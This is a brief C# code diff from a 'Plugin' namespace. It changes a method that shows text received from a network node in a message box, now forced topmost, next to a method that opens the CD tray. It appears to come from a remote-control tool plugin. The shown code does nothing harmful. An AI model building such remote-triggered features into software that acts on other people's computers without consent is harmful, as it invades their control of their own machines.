@@ -102,7 +102,7 @@ namespace Plugin
         public async Task ShowMessageBox(Node node)
         {
             string text = Encoding.UTF8.GetString(await node.ReceiveAsync());
-            await Task.Run(()=>MessageBox.Show(text));
+            await Task.Run(()=>MessageBox.Show(text, "Message",MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x40000));
         }
         public void OpenCDtray() 
         {
